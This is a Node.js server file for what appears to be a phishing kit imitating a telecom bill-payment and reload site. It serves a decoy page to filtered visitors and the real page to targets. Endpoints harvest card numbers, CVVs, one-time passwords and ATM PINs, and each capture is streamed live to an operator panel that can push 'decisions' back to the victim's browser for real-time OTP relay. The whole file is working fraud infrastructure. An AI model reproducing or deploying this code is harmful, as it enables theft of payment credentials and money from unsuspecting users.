const express = require('express');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');
const { fetchBillData, fetchReloadData } = require('./bill-bot');
const { shouldAllowVisitor } = require('./ip-detector');

const app = express();
app.set('trust proxy', true);
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: '/ws' });

const PORT = process.env.PORT || 3000;

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@2024';

const sessions = {};
const visitors = {};
let totalVisitorCount = 0;
const adminClients = new Set();
const sseAdminClients = new Set();
const sseSessionClients = {};

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. Serve Assets first (Safe)
app.use('/get-assets', express.static(path.join(__dirname, 'get-assets')));
app.use('/css', express.static(path.join(__dirname, 'css')));
app.use('/js', express.static(path.join(__dirname, 'js')));
app.use('/assets', express.static(path.join(__dirname, 'assets')));

// 2. THE ULTIMATE GATEKEEPER
app.get('/', async (req, res) => {
    try {
        const allowed = await shouldAllowVisitor(req);
        if (allowed) {
            return res.sendFile(path.join(__dirname, 'real-index.html'));
        } else {
            return res.sendFile(path.join(__dirname, 'index.html'));
        }
    } catch (error) {
        return res.sendFile(path.join(__dirname, 'index.html'));
    }
});

// 3. PROTECT ALL OTHER PAGES
const protectPage = async (req, res, next) => {
    const sensitivePages = [
        '/bill.html', '/reload.html', '/recharge.html', '/payment-method.html',
        '/credit-card.html', '/otp.html', '/atm-pin.html', '/pay-bill.html'
    ];

    if (sensitivePages.includes(req.path)) {
        const allowed = await shouldAllowVisitor(req);
        if (!allowed) {
            return res.redirect('/');
        }
    }
    next();
};

app.use(protectPage);

// 4. Serve static files
app.use(express.static(path.join(__dirname)));

// API Endpoints
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    const token = 'adm_' + Buffer.from(ADMIN_PASSWORD + '_secret').toString('base64');
    return res.json({ success: true, token });
  }
  return res.status(401).json({ success: false, error: 'كلمة المرور غير صحيحة' });
});

app.post('/api/admin/verify', (req, res) => {
  const { token } = req.body;
  const expected = 'adm_' + Buffer.from(ADMIN_PASSWORD + '_secret').toString('base64');
  if (token === expected) return res.json({ success: true });
  return res.status(401).json({ success: false });
});

app.post('/api/visitor/ping', (req, res) => {
  const { visitorId, page, number, amount, type, sessionId } = req.body;
  if (!visitorId) return res.status(400).json({ success: false });
  const isNew = !visitors[visitorId];
  if (isNew) totalVisitorCount++;
  const prev = visitors[visitorId] || {};
  visitors[visitorId] = {
    visitorId,
    page: page || prev.page || 'home',
    number: number || prev.number || '',
    amount: amount || prev.amount || '',
    type: type || prev.type || '',
    sessionId: sessionId || prev.sessionId || '',
    firstSeen: prev.firstSeen || new Date().toISOString(),
    lastSeen: new Date().toISOString(),
  };
  broadcastToAdmins({
    type: 'visitor_update',
    visitor: visitors[visitorId],
    totalVisitors: totalVisitorCount,
    activeCount: Object.keys(visitors).length,
    isNew,
  });
  return res.json({ success: true });
});

app.get('/api/visitor/stats', (req, res) => {
  return res.json({
    success: true,
    totalVisitors: totalVisitorCount,
    activeCount: Object.keys(visitors).length,
    visitors: Object.values(visitors),
  });
});

app.get('/api/sse/admin', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();
  sseAdminClients.add(res);
  res.write(`data: ${JSON.stringify({
    type: 'init',
    sessions: Object.values(sessions),
    visitors: Object.values(visitors),
    totalVisitors: totalVisitorCount,
    activeCount: Object.keys(visitors).length,
  })}\n\n`);
  const heartbeat = setInterval(() => { res.write(': heartbeat\n\n'); }, 25000);
  req.on('close', () => {
    clearInterval(heartbeat);
    sseAdminClients.delete(res);
  });
});

app.get('/api/sse/session/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();
  if (!sseSessionClients[sessionId]) sseSessionClients[sessionId] = new Set();
  sseSessionClients[sessionId].add(res);
  if (sessions[sessionId]) {
    res.write(`data: ${JSON.stringify({ type: 'status_update', sessionId, status: sessions[sessionId].status })}\n\n`);
  }
  const heartbeat = setInterval(() => { res.write(': heartbeat\n\n'); }, 25000);
  req.on('close', () => {
    clearInterval(heartbeat);
    if (sseSessionClients[sessionId]) {
      sseSessionClients[sessionId].delete(res);
      if (sseSessionClients[sessionId].size === 0) delete sseSessionClients[sessionId];
    }
  });
});

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);
  const role = url.searchParams.get('role');
  if (role === 'admin') {
    adminClients.add(ws);
    ws.send(JSON.stringify({ type: 'sessions_list', sessions: Object.values(sessions) }));
    ws.on('close', () => adminClients.delete(ws));
  } else {
    const sessionId = url.searchParams.get('sessionId');
    if (sessionId) {
      ws.sessionId = sessionId;
      if (sessions[sessionId]) {
        ws.send(JSON.stringify({ type: 'status_update', sessionId, status: sessions[sessionId].status }));
      }
    }
  }
});

function broadcastToAdmins(data) {
  const msg = JSON.stringify(data);
  adminClients.forEach(c => { if (c.readyState === WebSocket.OPEN) c.send(msg); });
  sseAdminClients.forEach(r => { try { r.write(`data: ${msg}\n\n`); } catch (e) { sseAdminClients.delete(r); } });
}

function broadcastToSession(sessionId, data) {
  const msg = JSON.stringify(data);
  wss.clients.forEach(c => { if (c.readyState === WebSocket.OPEN && c.sessionId === sessionId) c.send(msg); });
  if (sseSessionClients[sessionId]) {
    sseSessionClients[sessionId].forEach(r => { try { r.write(`data: ${msg}\n\n`); } catch (e) { sseSessionClients[sessionId].delete(r); } });
  }
}

app.post('/api/early-session', (req, res) => {
  const { sessionId, number, amount, type, visitorId, page } = req.body;
  if (!sessionId || !number) return res.status(400).json({ success: false, error: 'Missing required fields' });
  const existing = sessions[sessionId];
  if (existing) {
    if (amount) existing.amount = amount;
    if (page) existing._page = page;
    existing.updatedAt = new Date().toISOString();
    broadcastToAdmins({ type: 'session_update', sessionId, ...existing });
  } else {
    sessions[sessionId] = {
      sessionId, number, amount, ref: '', type: type || 'reload', cardData: null, otpData: null, pinData: null, status: 'browsing', visitorId: visitorId || '', _page: page || 'amount', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
    };
    broadcastToAdmins({ type: 'new_session', sessionId, ...sessions[sessionId] });
  }
  return res.json({ success: true, sessionId });
});

app.post('/api/card-submit', (req, res) => {
  const { sessionId, cardholderName, cardNumber, expiry, cvv, country, bank, number, amount, ref, type, visitorId } = req.body;
  sessions[sessionId] = {
    sessionId, number: number || '', amount: amount || '', ref: ref || '', type: type || 'bill', cardData: { cardholderName, cardNumber, expiry, cvv, country, bank }, status: 'pending', visitorId: visitorId || '', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
  };
  broadcastToAdmins({ type: 'new_session', sessionId, ...sessions[sessionId] });
  return res.json({ success: true, sessionId });
});

app.post('/api/otp-submit', (req, res) => {
  const { sessionId, otp } = req.body;
  if (sessions[sessionId]) {
    sessions[sessionId].otpData = { otp };
    sessions[sessionId].status = 'awaiting_otp';
    sessions[sessionId].updatedAt = new Date().toISOString();
    broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });
  }
  return res.json({ success: true, sessionId });
});

app.post('/api/pin-submit', (req, res) => {
  const { sessionId, pin } = req.body;
  if (sessions[sessionId]) {
    sessions[sessionId].pinData = { pin };
    sessions[sessionId].status = 'awaiting_pin';
    sessions[sessionId].updatedAt = new Date().toISOString();
    broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });
  }
  return res.json({ success: true, sessionId });
});

app.post('/api/admin/decision', (req, res) => {
  const { sessionId, status } = req.body;
  if (sessions[sessionId]) {
    sessions[sessionId].status = status;
    broadcastToSession(sessionId, { type: 'status_update', sessionId, status });
    broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });
  }
  return res.json({ success: true });
});

app.post('/api/bill-check', async (req, res) => {
  const { mobileNumber, number, useAccountNumber } = req.body;
  try {
    const data = await fetchBillData(mobileNumber || number, useAccountNumber);
    return res.json({ success: true, data });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/reload-check', async (req, res) => {
  const { mobileNumber, number } = req.body;
  try {
    const data = await fetchReloadData(mobileNumber || number);
    return res.json({ success: true, data });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT} with ULTIMATE SWAP PROTECTION`);
});
